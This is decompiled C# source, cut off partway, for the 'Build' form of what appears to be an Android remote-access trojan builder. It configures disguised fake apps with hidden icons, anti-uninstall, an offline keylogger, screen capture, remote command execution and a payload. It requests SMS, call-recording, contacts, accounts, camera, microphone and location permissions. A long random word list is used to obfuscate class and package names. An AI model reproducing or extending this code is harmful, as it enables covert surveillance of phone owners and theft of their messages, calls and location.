using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;

// Token: 0x02000038 RID: 56
[DesignerGenerated]
public partial class Build : Form
{
	// Token: 0x17000103 RID: 259
	// (get) Token: 0x060001F8 RID: 504 RVA: 0x00014FA0 File Offset: 0x000131A0
	// (set) Token: 0x060001F9 RID: 505 RVA: 0x00002449 File Offset: 0x00000649
	public object ZipFile
	{
		[CompilerGenerated]
		get
		{
			return this._ZipFile;
		}
		[CompilerGenerated]
		set
		{
			this._ZipFile = RuntimeHelpers.GetObjectValue(value);
		}
	}

	// Token: 0x060001FC RID: 508 RVA: 0x0001ED7C File Offset: 0x0001CF7C
	public Build()
	{
		base.Load += this.Build_Load;
		base.Closing += this.Build_Closing;
		base.FormClosing += this.Build_FormClosing;
		this.MyStamp = " 2023 Copyright";
		this.keybackVersion = false;
		this.spl_arguments = "[x0b0x]";
		this.BIND_Path = "null";
		this.BIND_EX = "null";
		this.isuper = "off";
		this.anuninstall = "off";
		this.isAOX = "off";
		this.isnetwork = "off";
		this.iscaponce = "off";
		this.isautounlock = "off";
		this.MonitorPack = "Blank";
		this.trackerlist = "Blank";
		this.isBind = "off";
		this.isskipreinstall = "off";
		this.iskeepscreen = "off";
		this.isHideprims = "off";
		this.isadmin = "off";
		this.isautostart = "off";
		this.isQuick = "off";
		this.isDrawing = "off";
		this.isnotifi = "off";
		this.intent_ = "null";
		this.iconPatch = "null";
		this.Prim_sendsms = "no";
		this.Prim_recordcalls = "no";
		this.Prim_wallpaper = "no";
		this.Prim_readsms = "no";
		this.Prim_calllog = "no";
		this.Prim_readcontact = "no";
		this.Prim_readacounts = "no";
		this.Prim_camera = "no";
		this.Prim_microphone = "no";
		this.Prim_loacation1 = "no";
		this.Prim_loacation2 = "no";
		this.Prim_loacation3 = "no";
		this.Prim_callphone = "no";
		this.SplitterDNS = "[x0DNS0x]";
		this.colo0 = Color.FromArgb(190, 190, 190);
		this.colo1 = Color.FromArgb(20, 20, 20);
		this.PRIMS = "";
		this.THETYPE = "T";
		this.FAKEAPPNAME = " ";
		this.FAKEAPPlink = " ";
		this.FAKEAPPicon = "null";
		this.OFFKEYLOG = "null";
		this.ANTIEMO = "null";
		this.APKVERSION = "29";
		this.NOTIFI_MSG = "";
		this.NOTIFI_TITLE = "";
		this.HIDETYPE = "";
		this.TheTarget = "";
		this.UseRecorder = "NO";
		this.NewFakeSize = 0;
		this._Time = 10;
		this._Bitmap_ICO = null;
		this.cou = 0;
		this.vulTrack = 0;
		this.pack1 = "package";
		this.pack2 = "name";
		this.Nactivz = "activz";
		this.Nbrodatz = "brodatz";
		this.Nservziz = "servziz";
		this.Ntolziz = "tolziz";
		this.NRequestPermissions = "RequestPermissions";
		this.N_trns_g_ = "_trns_g_";
		this.NStartScreenCap = "StartScreenCap";
		this.NRequestAccess = "RequestAccess";
		this.NHandelScreenCap = "HandelScreenCap";
		this.N_news_g_ = "_news_g_";
		this.N_strt_view_ = "_strt_view_";
		this.N_sc_fb_ = "_sc_fb_";
		this.NRequestDraw = "RequestDraw";
		this.NRequestBattery = "RequestBattery";
		this.N_engine_wrk_ = "_engine_wrk_";
		this.N_skin_cls_ = "_skin_cls_";
		this.N_update_app_ = "_update_app_";
		this.N_callr_lsnr_ = "_callr_lsnr_";
		this.N_clss_loder_ = "_clss_loder_";
		this.N_excut_meth_ = "_excut_meth_";
		this.N_run_comnd_ = "_run_comnd_";
		this.N_get_me_fil_ = "_get_me_fil_";
		this.NCommandsService = "CommandsService";
		this.NClassGen0 = "QQ0";
		this.NClassGen1 = "QQ1";
		this.NClassGen2 = "QQ2";
		this.NClassGen3 = "QQ3";
		this.NClassGen4 = "QQ4";
		this.NClassGen5 = "QQ5";
		this.NClassGen6 = "QQ6";
		this.NClassGen8 = "QQ8";
		this.NClassGen9 = "QQ9";
		this.NClassGen10 = "QQ10";
		this.NClassGen11 = "QQ11";
		this.NClassGen12 = "QQ12";
		this.NClassGen13 = "QQ13";
		this.NClassGen14 = "QQ14";
		this.payload = "payload";
		this.NresoString0 = "str0";
		this.NresoString1 = "str1";
		this.NresoString2 = "str2";
		this.NresoString3 = "str3";
		this.NresoString4 = "str4";
		this.NresoString5 = "str5";
		this.NresoString6 = "str6";
		this.NresoString7 = "str7";
		this.NresoString8 = "str8";
		this.NresoString9 = "str9";
		this.NresoString10 = "str10";
		this.NresoString11 = "str11";
		this.NresoString12 = "str12";
		this.Napp_reso0 = "app0";
		this.Ndraw_ico = "ico0";
		this.Ndraw_notifi = "ico1";
		this.NwebXML = "web0";
		this.NnotifiXML = "noti8";
		this.new_exit_mth = "str0";
		this.new_wifipolc = "str1";
		this.new_formatpacket = "str2";
		this.new_dzip = "str3";
		this.new_getbyte = "str4";
		this.new_base_mth = "str5";
		this.new_getstr = "str5";
		this.new_czip = "str5";
		this.new_inst = "str5";
		this.new_strt_con_ = "str5";
		this.new_fist_inf_ = "str5";
		this.new_new_con_ = "str5";
		this.new_send_it_ = "str5";
		this.new_Reblace_ = "str5";
		this.new_runn_srv_ = "str5";
		this.NEWRANDOM = "";
		this.rshit = null;
		this.oncedelete = true;
		this.FolderApk = false;
		this.Builtapk = false;
		this.StartedZip = false;
		this.encrypt_started = false;
		this.protectfinished = false;
		this.pumpstarted = false;
		this.pumpfinished = false;
		this.firstpump = false;
		this.Once = false;
		this.randmid = new string[]
		{
			"a",
			"aa",
			"aaa",
			"aaron",
			"ab",
			"abandoned",
			"abc",
			"aberdeen",
			"abilities",
			"ability",
			"able",
			"aboriginal",
			"abortion",
			"about",
			"above",
			"abraham",
			"abroad",
			"abs",
			"absence",
			"absent",
			"absolute",
			"absolutely",
			"absorption",
			"abstract",
			"abstracts",
			"abu",
			"abuse",
			"ac",
			"academic",
			"academics",
			"academy",
			"acc",
			"accent",
			"accept",
			"acceptable",
			"acceptance",
			"accepted",
			"accepting",
			"accepts",
			"access",
			"accessed",
			"accessibility",
			"accessible",
			"accessing",
			"accessories",
			"accessory",
			"accident",
			"accidents",
			"accommodate",
			"accommodation",
			"accommodations",
			"accompanied",
			"accompanying",
			"accomplish",
			"accomplished",
			"accordance",
			"according",
			"accordingly",
			"account",
			"accountability",
			"accounting",
			"accounts",
			"accreditation",
			"accredited",
			"accuracy",
			"accurate",
			"accurately",
			"accused",
			"acdbentity",
			"ace",
			"acer",
			"achieve",
			"achieved",
			"achievement",
			"achievements",
			"achieving",
			"acid",
			"acids",
			"acknowledge",
			"acknowledged",
			"acm",
			"acne",
			"acoustic",
			"acquire",
			"acquired",
			"acquisition",
			"acquisitions",
			"acre",
			"acres",
			"acrobat",
			"across",
			"acrylic",
			"act",
			"acting",
			"action",
			"actions",
			"activated",
			"activation",
			"active",
			"actively",
			"activists",
			"activities",
			"activity",
			"actor",
			"actors",
			"actress",
			"acts",
			"actual",
			"actually",
			"acute",
			"ad",
			"ada",
			"adam",
			"adams",
			"adaptation",
			"adapted",
			"adapter",
			"adapters",
			"adaptive",
			"adaptor",
			"add",
			"added",
			"addiction",
			"adding",
			"addition",
			"additional",
			"additionally",
			"additions",
			"address",
			"addressed",
			"addresses",
			"addressing",
			"adds",
			"adelaide",
			"adequate",
			"adidas",
			"adipex",
			"adjacent",
			"adjust",
			"adjustable",
			"adjusted",
			"adjustment",
			"adjustments",
			"admin",
			"administered",
			"administration",
			"administrative",
			"administrator",
			"administrators",
			"admission",
			"admissions",
			"admit",
			"admitted",
			"adobe",
			"adolescent",
			"adopt",
			"adopted",
			"adoption",
			"adrian",
			"ads",
			"adsl",
			"adult",
			"adults",
			"advance",
			"advanced",
			"advancement",
			"advances",
			"advantage",
			"advantages",
			"adventure",
			"adventures",
			"adverse",
			"advert",
			"advertise",
			"advertisement",
			"advertisements",
			"advertiser",
			"advertisers",
			"advertising",
			"advice",
			"advise",
			"advised",
			"advisor",
			"advisors",
			"advisory",
			"advocacy",
			"advocate",
			"adware",
			"ae",
			"aerial",
			"aerospace",
			"af",
			"affair",
			"affairs",
			"affect",
			"affected",
			"affecting",
			"affects",
			"affiliate",
			"affiliated",
			"affiliates",
			"affiliation",
			"afford",
			"affordable",
			"afghanistan",
			"afraid",
			"africa",
			"african",
			"after",
			"afternoon",
			"afterwards",
			"ag",
			"again",
			"against",
			"age",
			"aged",
			"agencies",
			"agency",
			"agenda",
			"agent",
			"agents",
			"ages",
			"aggregate",
			"aggressive",
			"aging",
			"ago",
			"agree",
			"agreed",
			"agreement",
			"agreements",
			"agrees",
			"agricultural",
			"agriculture",
			"ah",
			"ahead",
			"ai",
			"aid",
			"aids",
			"aim",
			"aimed",
			"aims",
			"air",
			"aircraft",
			"airfare",
			"airline",
			"airlines",
			"airplane",
			"airport",
			"airports",
			"aj",
			"ak",
			"aka",
			"al",
			"ala",
			"alabama",
			"alan",
			"alarm",
			"alaska",
			"albania",
			"albany",
			"albert",
			"alberta",
			"album",
			"albums",
			"albuquerque",
			"alcohol",
			"alert",
			"alerts",
			"alex",
			"alexander",
			"alexandria",
			"alfred",
			"algebra",
			"algeria",
			"algorithm",
			"algorithms",
			"ali",
			"alias",
			"alice",
			"alien",
			"align",
			"alignment",
			"alike",
			"alive",
			"all",
			"allah",
			"allan",
			"alleged",
			"allen",
			"allergy",
			"alliance",
			"allied",
			"allocated",
			"allocation",
			"allow",
			"allowance",
			"allowed",
			"allowing",
			"allows",
			"alloy",
			"almost",
			"alone",
			"along",
			"alot",
			"alpha",
			"alphabetical",
			"alpine",
			"already",
			"also",
			"alt",
			"alter",
			"altered",
			"alternate",
			"alternative",
			"alternatively",
			"alternatives",
			"although",
			"alto",
			"aluminium",
			"aluminum",
			"alumni",
			"always",
			"am",
			"amanda",
			"amateur",
			"amazing",
			"amazon",
			"amazoncom",
			"amazoncouk",
			"ambassador",
			"amber",
			"ambien",
			"ambient",
			"amd",
			"amend",
			"amended",
			"amendment",
			"amendments",
			"amenities",
			"america",
			"american",
			"americans",
			"americas",
			"amino",
			"among",
			"amongst",
			"amount",
			"amounts",
			"amp",
			"ampland",
			"amplifier",
			"amsterdam",
			"amy",
			"an",
			"ana",
			"anaheim",
			"anal",
			"analog",
			"analyses",
			"analysis",
			"analyst",
			"analysts",
			"analytical",
			"analyze",
			"analyzed",
			"anatomy",
			"anchor",
			"ancient",
			"and",
			"andale",
			"anderson",
			"andorra",
			"andrea",
			"andreas",
			"andrew",
			"andrews",
			"andy",
			"angel",
			"angela",
			"angeles",
			"angels",
			"anger",
			"angle",
			"angola",
			"angry",
			"animal",
			"animals",
			"animated",
			"animation",
			"anime",
			"ann",
			"anna",
			"anne",
			"annex",
			"annie",
			"anniversary",
			"annotated",
			"annotation",
			"announce",
			"announced",
			"announcement",
			"announcements",
			"announces",
			"annoying",
			"annual",
			"annually",
			"anonymous",
			"another",
			"answer",
			"answered",
			"answering",
			"answers",
			"ant",
			"antarctica",
			"antenna",
			"anthony",
			"anthropology",
			"anti",
			"antibodies",
			"antibody",
			"anticipated",
			"antigua",
			"antique",
			"antiques",
			"antivirus",
			"antonio",
			"anxiety",
			"any",
			"anybody",
			"anymore",
			"anyone",
			"anything",
			"anytime",
			"anyway",
			"anywhere",
			"aol",
			"ap",
			"apache",
			"apart",
			"apartment",
			"apartments",
			"api",
			"apnic",
			"apollo",
			"app",
			"apparatus",
			"apparel",
			"apparent",
			"apparently",
			"appeal",
			"appeals",
			"appear",
			"appearance",
			"appeared",
			"appearing",
			"appears",
			"appendix",
			"apple",
			"appliance",
			"appliances",
			"applicable",
			"applicant",
			"applicants",
			"application",
			"applications",
			"applied",
			"applies",
			"apply",
			"applying",
			"appointed",
			"appointment",
			"appointments",
			"appraisal",
			"appreciate",
			"appreciated",
			"appreciation",
			"approach",
			"approaches",
			"appropriate",
			"appropriations",
			"approval",
			"approve",
			"approved",
			"approx",
			"approximate",
			"approximately",
			"apps",
			"apr",
			"april",
			"apt",
			"aqua",
			"aquarium",
			"aquatic",
			"ar",
			"arab",
			"arabia",
			"arabic",
			"arbitrary",
			"arbitration",
			"arc",
			"arcade",
			"arch",
			"architect",
			"architects",
			"architectural",
			"architecture",
			"archive",
			"archived",
			"archives",
			"arctic",
			"are",
			"area",
			"areas",
			"arena",
			"arg",
			"argentina",
			"argue",
			"argued",
			"argument",
			"arguments",
			"arise",
			"arising",
			"arizona",
			"arkansas",
			"arlington",
			"arm",
			"armed",
			"armenia",
			"armor",
			"arms",
			"armstrong",
			"army",
			"arnold",
			"around",
			"arrange",
			"arranged",
			"arrangement",
			"arrangements",
			"array",
			"arrest",
			"arrested",
			"arrival",
			"arrivals",
			"arrive",
			"arrived",
			"arrives",
			"arrow",
			"art",
			"arthritis",
			"arthur",
			"article",
			"articles",
			"artificial",
			"artist",
			"artistic",
			"artists",
			"arts",
			"artwork",
			"aruba",
			"as",
			"asbestos",
			"ascii",
			"ash",
			"ashley",
			"asia",
			"asian",
			"aside",
			"asin",
			"ask",
			"asked",
			"asking",
			"asks",
			"asn",
			"asp",
			"aspect",
			"aspects",
			"aspnet",
			"ass",
			"assault",
			"assembled",
			"assembly",
			"assess",
			"assessed",
			"assessing",
			"assessment",
			"assessments",
			"asset",
			"assets",
			"assign",
			"assigned",
			"assignment",
			"assignments",
			"assist",
			"assistance",
			"assistant",
			"assisted",
			"assists",
			"associate",
			"associated",
			"associates",
			"association",
			"associations",
			"assume",
			"assumed",
			"assumes",
			"assuming",
			"assumption",
			"assumptions",
			"assurance",
			"assure",
			"assured",
			"asthma",
			"astrology",
			"astronomy",
			"asus",
			"at",
			"ata",
			"ate",
			"athens",
			"athletes",
			"athletic",
			"athletics",
			"ati",
			"atlanta",
			"atlantic",
			"atlas",
			"atm",
			"atmosphere",
			"atmospheric",
			"atom",
			"atomic",
			"attach",
			"attached",
			"attachment",
			"attachments",
			"attack",
			"attacked",
			"attacks",
			"attempt",
			"attempted",
			"attempting",
			"attempts",
			"attend",
			"attendance",
			"attended",
			"attending",
			"attention",
			"attitude",
			"attitudes",
			"attorney",
			"attorneys",
			"attract",
			"attraction",
			"attractions",
			"attractive",
			"attribute",
			"attributes",
			"au",
			"auburn",
			"auckland",
			"auction",
			"auctions",
			"aud",
			"audi",
			"audience",
			"audio",
			"audit",
			"auditor",
			"aug",
			"august",
			"aurora",
			"aus",
			"austin",
			"australia",
			"australian",
			"austria",
			"authentic",
			"authentication",
			"author",
			"authorities",
			"authority",
			"authorization",
			"authorized",
			"authors",
			"auto",
			"automated",
			"automatic",
			"automatically",
			"automation",
			"automobile",
			"automobiles",
			"automotive",
			"autos",
			"autumn",
			"av",
			"availability",
			"available",
			"avatar",
			"ave",
			"avenue",
			"average",
			"avg",
			"avi",
			"aviation",
			"avoid",
			"avoiding",
			"avon",
			"aw",
			"award",
			"awarded",
			"awards",
			"aware",
			"awareness",
			"away",
			"awesome",
			"awful",
			"axis",
			"aye",
			"az",
			"azerbaijan",
			"b",
			"ba",
			"babe",
			"babes",
			"babies",
			"baby",
			"bachelor",
			"back",
			"backed",
			"background",
			"backgrounds",
			"backing",
			"backup",
			"bacon",
			"bacteria",
			"bacterial",
			"bad",
			"badge",
			"badly",
			"bag",
			"baghdad",
			"bags",
			"bahamas",
			"bahrain",
			"bailey",
			"baker",
			"baking",
			"balance",
			"balanced",
			"bald",
			"bali",
			"ball",
			"ballet",
			"balloon",
			"ballot",
			"balls",
			"baltimore",
			"ban",
			"banana",
			"band",
			"bands",
			"bandwidth",
			"bang",
			"bangbus",
			"bangkok",
			"bangladesh",
			"bank",
			"banking",
			"bankruptcy",
			"banks",
			"banned",
			"banner",
			"banners",
			"baptist",
			"bar",
			"barbados",
			"barbara",
			"barbie",
			"barcelona",
			"bare",
			"barely",
			"bargain",
			"bargains",
			"barn",
			"barnes",
			"barrel",
			"barrier",
			"barriers",
			"barry",
			"bars",
			"base",
			"baseball",
			"based",
			"baseline",
			"basement",
			"basename",
			"bases",
			"basic",
			"basically",
			"basics",
			"basin",
			"basis",
			"basket",
			"basketball",
			"baskets",
			"bass",
			"bat",
			"batch",
			"bath",
			"bathroom",
			"bathrooms",
			"baths",
			"batman",
			"batteries",
			"battery",
			"battle",
			"battlefield",
			"bay",
			"bb",
			"bbc",
			"bbs",
			"bbw",
			"bc",
			"bd",
			"bdsm",
			"be",
			"beach",
			"beaches",
			"beads",
			"beam",
			"bean",
			"beans",
			"bear",
			"bearing",
			"bears",
			"beast",
			"beastality",
			"beastiality",
			"beat",
			"beatles",
			"beats",
			"beautiful",
			"beautifully",
			"beauty",
			"beaver",
			"became",
			"because",
			"become",
			"becomes",
			"becoming",
			"bed",
			"bedding",
			"bedford",
			"bedroom",
			"bedrooms",
			"beds",
			"bee",
			"beef",
			"been",
			"beer",
			"before",
			"began",
			"begin",
			"beginner",
			"beginners",
			"beginning",
			"begins",
			"begun",
			"behalf",
			"behavior",
			"behavioral",
			"behaviour",
			"behind",
			"beijing",
			"being",
			"beings",
			"belarus",
			"belfast",
			"belgium",
			"belief",
			"beliefs",
			"believe",
			"believed",
			"believes",
			"belize",
			"belkin",
			"bell",
			"belle",
			"belly",
			"belong",
			"belongs",
			"below",
			"belt",
			"belts",
			"ben",
			"bench",
			"benchmark",
			"bend",
			"beneath",
			"beneficial",
			"benefit",
			"benefits",
			"benjamin",
			"bennett",
			"benz",
			"berkeley",
			"berlin",
			"bermuda",
			"bernard",
			"berry",
			"beside",
			"besides",
			"best",
			"bestiality",
			"bestsellers",
			"bet",
			"beta",
			"beth",
			"better",
			"betting",
			"betty",
			"between",
			"beverage",
			"beverages",
			"beverly",
			"beyond",
			"bg",
			"bhutan",
			"bi",
			"bias",
			"bible",
			"biblical",
			"bibliographic",
			"bibliography",
			"bicycle",
			"bid",
			"bidder",
			"bidding",
			"bids",
			"big",
			"bigger",
			"biggest",
			"bike",
			"bikes",
			"bikini",
			"bill",
			"billing",
			"billion",
			"bills",
			"billy",
			"bin",
			"binary",
			"bind",
			"binding",
			"bingo",
			"bio",
			"biodiversity",
			"biographies",
			"biography",
			"biol",
			"biological",
			"biology",
			"bios",
			"biotechnology",
			"bird",
			"birds",
			"birmingham",
			"birth",
			"birthday",
			"bishop",
			"bit",
			"bitch",
			"bite",
			"bits",
			"biz",
			"bizarre",
			"bizrate",
			"bk",
			"bl",
			"black",
			"blackberry",
			"blackjack",
			"blacks",
			"blade",
			"blades",
			"blah",
			"blair",
			"blake",
			"blame",
			"blank",
			"blanket",
			"blast",
			"bleeding",
			"blend",
			"bless",
			"blessed",
			"blind",
			"blink",
			"block",
			"blocked",
			"blocking",
			"blocks",
			"blog",
			"blogger",
			"bloggers",
			"blogging",
			"blogs",
			"blond",
			"blonde",
			"blood",
			"bloody",
			"bloom",
			"bloomberg",
			"blow",
			"blowing",
			"blowjob",
			"blowjobs",
			"blue",
			"blues",
			"bluetooth",
			"blvd",
			"bm",
			"bmw",
			"bo",
			"board",
			"boards",
			"boat",
			"boating",
			"boats",
			"bob",
			"bobby",
			"boc",
			"bodies",
			"body",
			"bold",
			"bolivia",
			"bolt",
			"bomb",
			"bon",
			"bond",
			"bondage",
			"bonds",
			"bone",
			"bones",
			"bonus",
			"boob",
			"boobs",
			"book",
			"booking",
			"bookings",
			"bookmark",
			"bookmarks",
			"books",
			"bookstore",
			"bool",
			"boolean",
			"boom",
			"boost",
			"boot",
			"booth",
			"boots",
			"booty",
			"border",
			"borders",
			"bored",
			"boring",
			"born",
			"borough",
			"bosnia",
			"boss",
			"boston",
			"both",
			"bother",
			"botswana",
			"bottle",
			"bottles",
			"bottom",
			"bought",
			"boulder",
			"boulevard",
			"bound",
			"boundaries",
			"boundary",
			"bouquet",
			"boutique",
			"bow",
			"bowl",
			"bowling",
			"box",
			"boxed",
			"boxes",
			"boxing",
			"boy",
			"boys",
			"bp",
			"br",
			"bra",
			"bracelet",
			"bracelets",
			"bracket",
			"brad",
			"bradford",
			"bradley",
			"brain",
			"brake",
			"brakes",
			"branch",
			"branches",
			"brand",
			"brandon",
			"brands",
			"bras",
			"brass",
			"brave",
			"brazil",
			"brazilian",
			"breach",
			"bread",
			"break",
			"breakdown",
			"breakfast",
			"breaking",
			"breaks",
			"breast",
			"breasts",
			"breath",
			"breathing",
			"breed",
			"breeding",
			"breeds",
			"brian",
			"brick",
			"bridal",
			"bride",
			"bridge",
			"bridges",
			"brief",
			"briefing",
			"briefly",
			"briefs",
			"bright",
			"brighton",
			"brilliant",
			"bring",
			"bringing",
			"brings",
			"brisbane",
			"bristol",
			"britain",
			"britannica",
			"british",
			"britney",
			"broad",
			"broadband",
			"broadcast",
			"broadcasting",
			"broader",
			"broadway",
			"brochure",
			"brochures",
			"broke",
			"broken",
			"broker",
			"brokers",
			"bronze",
			"brook",
			"brooklyn",
			"brooks",
			"bros",
			"brother",
			"brothers",
			"brought",
			"brown",
			"browse",
			"browser",
			"browsers",
			"browsing",
			"bruce",
			"brunei",
			"brunette",
			"brunswick",
			"brush",
			"brussels",
			"brutal",
			"bryan",
			"bryant",
			"bs",
			"bt",
			"bubble",
			"buck",
			"bucks",
			"budapest",
			"buddy",
			"budget",
			"budgets",
			"buf",
			"buffalo",
			"buffer",
			"bufing",
			"bug",
			"bugs",
			"build",
			"builder",
			"builders",
			"building",
			"buildings",
			"builds",
			"built",
			"bukkake",
			"bulgaria",
			"bulgarian",
			"bulk",
			"bull",
			"bullet",
			"bulletin",
			"bumper",
			"bunch",
			"bundle",
			"bunny",
			"burden",
			"bureau",
			"buried",
			"burke",
			"burlington",
			"burn",
			"burner",
			"burning",
			"burns",
			"burst",
			"burton",
			"bus",
			"buses",
			"bush",
			"business",
			"businesses",
			"busty",
			"busy",
			"but",
			"butler",
			"butt",
			"butter",
			"butterfly",
			"button",
			"buttons",
			"butts",
			"buy",
			"buyer",
			"buyers",
			"buying",
			"buys",
			"buzz",
			"bw",
			"by",
			"bye",
			"byte",
			"bytes",
			"c",
			"ca",
			"cab",
			"cabin",
			"cabinet",
			"cabinets",
			"cable",
			"cables",
			"cache",
			"cached",
			"cad",
			"cadillac",
			"cafe",
			"cage",
			"cake",
			"cakes",
			"cal",
			"calcium",
			"calculate",
			"calculated",
			"calculation",
			"calculations",
			"calculator",
			"calculators",
			"calendar",
			"calendars",
			"calgary",
			"calibration",
			"calif",
			"california",
			"call",
			"called",
			"calling",
			"calls",
			"calm",
			"calvin",
			"cam",
			"cambodia",
			"cambridge",
			"camcorder",
			"camcorders",
			"came",
			"camel",
			"camera",
			"cameras",
			"cameron",
			"cameroon",
			"camp",
			"campaign",
			"campaigns",
			"campbell",
			"camping",
			"camps",
			"campus",
			"cams",
			"can",
			"canada",
			"canadian",
			"canal",
			"canberra",
			"cancel",
			"cancellation",
			"cancelled",
			"cancer",
			"candidate",
			"candidates",
			"candle",
			"candles",
			"candy",
			"cannon",
			"canon",
			"cant",
			"canvas",
			"canyon",
			"cap",
			"capabilities",
			"capability",
			"capable",
			"capacity",
			"cape",
			"capital",
			"capitol",
			"caps",
			"captain",
			"capture",
			"captured",
			"car",
			"carb",
			"carbon",
			"card",
			"cardiac",
			"cardiff",
			"cardiovascular",
			"cards",
			"care",
			"career",
			"careers",
			"careful",
			"carefully",
			"carey",
			"cargo",
			"caribbean",
			"caring",
			"carl",
			"carlo",
			"carlos",
			"carmen",
			"carnival",
			"carol",
			"carolina",
			"caroline",
			"carpet",
			"carried",
			"carrier",
			"carriers",
			"carries",
			"carroll",
			"carry",
			"carrying",
			"cars",
			"cart",
			"carter",
			"cartoon",
			"cartoons",
			"cartridge",
			"cartridges",
			"cas",
			"casa",
			"case",
			"cases",
			"casey",
			"cash",
			"cashiers",
			"casino",
			"casinos",
			"casio",
			"cassette",
			"cast",
			"casting",
			"castle",
			"casual",
			"cat",
			"catalog",
			"catalogs",
			"catalogue",
			"catalyst",
			"catch",
			"categories",
			"category",
			"catering",
			"cathedral",
			"catherine",
			"catholic",
			"cats",
			"cattle",
			"caught",
			"cause",
			"caused",
			"causes",
			"causing",
			"caution",
			"cave",
			"cayman",
			"cb",
			"cbs",
			"cc",
			"ccd",
			"cd",
			"cdna",
			"cds",
			"cdt",
			"ce",
			"cedar",
			"ceiling",
			"celebrate",
			"celebration",
			"celebrities",
			"celebrity",
			"celebs",
			"cell",
			"cells",
			"cellular",
			"celtic",
			"cement",
			"cemetery",
			"census",
			"cent",
			"center",
			"centered",
			"centers",
			"central",
			"centre",
			"centres",
			"cents",
			"centuries",
			"century",
			"ceo",
			"ceramic",
			"ceremony",
			"certain",
			"certainly",
			"certificate",
			"certificates",
			"certification",
			"certified",
			"cest",
			"cet",
			"cf",
			"cfr",
			"cg",
			"cgi",
			"ch",
			"chad",
			"chain",
			"chains",
			"chair",
			"chairman",
			"chairs",
			"challenge",
			"challenged",
			"challenges",
			"challenging",
			"chamber",
			"chambers",
			"champagne",
			"champion",
			"champions",
			"championship",
			"championships",
			"chan",
			"chance",
			"chancellor",
			"chances",
			"change",
			"changed",
			"changelog",
			"changes",
			"changing",
			"channel",
			"channels",
			"chaos",
			"chapel",
			"chapter",
			"chapters",
			"char",
			"character",
			"characteristic",
			"characteristics",
			"characterization",
			"characterized",
			"characters",
			"charge",
			"charged",
			"charger",
			"chargers",
			"charges",
			"charging",
			"charitable",
			"charity",
			"charles",
			"charleston",
			"charlie",
			"charlotte",
			"charm",
			"charming",
			"charms",
			"chart",
			"charter",
			"charts",
			"chase",
			"chassis",
			"chat",
			"cheap",
			"cheaper",
			"cheapest",
			"cheat",
			"cheats",
			"check",
			"checked",
			"checking",
			"checklist",
			"checkout",
			"checks",
			"cheers",
			"cheese",
			"chef",
			"chelsea",
			"chem",
			"chemical",
			"chemicals",
			"chemistry",
			"chen",
			"cheque",
			"cherry",
			"chess",
			"chest",
			"chester",
			"chevrolet",
			"chevy",
			"chi",
			"chicago",
			"chick",
			"chicken",
			"chicks",
			"chief",
			"child",
			"childhood",
			"children",
			"childrens",
			"chile",
			"china",
			"chinese",
			"chip",
			"chips",
			"cho",
			"chocolate",
			"choice",
			"choices",
			"choir",
			"cholesterol",
			"choose",
			"choosing",
			"chorus",
			"chose",
			"chosen",
			"chris",
			"christ",
			"christian",
			"christianity",
			"christians",
			"christina",
			"christine",
			"christmas",
			"christopher",
			"chrome",
			"chronic",
			"chronicle",
			"chronicles",
			"chrysler",
			"chubby",
			"chuck",
			"church",
			"churches",
			"ci",
			"cia",
			"cialis",
			"ciao",
			"cigarette",
			"cigarettes",
			"cincinnati",
			"cindy",
			"cinema",
			"cingular",
			"cio",
			"cir",
			"circle",
			"circles",
			"circuit",
			"circuits",
			"circular",
			"circulation",
			"circumstances",
			"circus",
			"cisco",
			"citation",
			"citations",
			"cite",
			"cited",
			"cities",
			"citizen",
			"citizens",
			"citizenship",
			"city",
			"citysearch",
			"civic",
			"civil",
			"civilian",
			"civilization",
			"cj",
			"cl",
			"claim",
			"claimed",
			"claims",
			"claire",
			"clan",
			"clara",
			"clarity",
			"clark",
			"clarke",
			"class",
			"classes",
			"classic",
			"classical",
			"classics",
			"classification",
			"classified",
			"classifieds",
			"classroom",
			"clause",
			"clay",
			"clean",
			"cleaner",
			"cleaners",
			"cleaning",
			"cleanup",
			"clear",
			"clearance",
			"cleared",
			"clearing",
			"clearly",
			"clerk",
			"cleveland",
			"click",
			"clicking",
			"clicks",
			"client",
			"clients",
			"cliff",
			"climate",
			"climb",
			"climbing",
			"clinic",
			"clinical",
			"clinics",
			"clinton",
			"clip",
			"clips",
			"clock",
			"clocks",
			"clone",
			"close",
			"closed",
			"closely",
			"closer",
			"closes",
			"closest",
			"closing",
			"closure",
			"cloth",
			"clothes",
			"clothing",
			"cloud",
			"clouds",
			"cloudy",
			"club",
			"clubs",
			"cluster",
			"clusters",
			"cm",
			"cms",
			"cn",
			"cnet",
			"cnetcom",
			"cnn",
			"co",
			"coach",
			"coaches",
			"coaching",
			"coal",
			"coalition",
			"coast",
			"coastal",
			"coat",
			"coated",
			"coating",
			"cock",
			"cocks",
			"cod",
			"code",
			"codes",
			"coding",
			"coffee",
			"cognitive",
			"cohen",
			"coin",
			"coins",
			"col",
			"cold",
			"cole",
			"coleman",
			"colin",
			"collaboration",
			"collaborative",
			"collapse",
			"collar",
			"colleague",
			"colleagues",
			"collect",
			"collectables",
			"collected",
			"collectible",
			"collectibles",
			"collecting",
			"collection",
			"collections",
			"collective",
			"collector",
			"collectors",
			"college",
			"colleges",
			"collins",
			"cologne",
			"colombia",
			"colon",
			"colonial",
			"colony",
			"color",
			"colorado",
			"colored",
			"colors",
			"colour",
			"colours",
			"columbia",
			"columbus",
			"column",
			"columnists",
			"columns",
			"org",
			"combat",
			"combination",
			"combinations",
			"combine",
			"combined",
			"combines",
			"combining",
			"combo",
			"come",
			"comedy",
			"comes",
			"comfort",
			"comfortable",
			"comic",
			"comics",
			"coming",
			"comm",
			"command",
			"commander",
			"commands",
			"comment",
			"commentary",
			"commented",
			"comments",
			"commerce",
			"commercial",
			"commission",
			"commissioner",
			"commissioners",
			"commissions",
			"commit",
			"commitment",
			"commitments",
			"committed",
			"committee",
			"committees",
			"commodities",
			"commodity",
			"common",
			"commonly",
			"commons",
			"commonwealth",
			"communicate",
			"communication",
			"communications",
			"communist",
			"communities",
			"community",
			"comp",
			"compact",
			"companies",
			"companion",
			"company",
			"compaq",
			"comparable",
			"comparative",
			"compare",
			"compared",
			"comparing",
			"comparison",
			"comparisons",
			"compatibility",
			"compatible",
			"compensation",
			"compete",
			"competent",
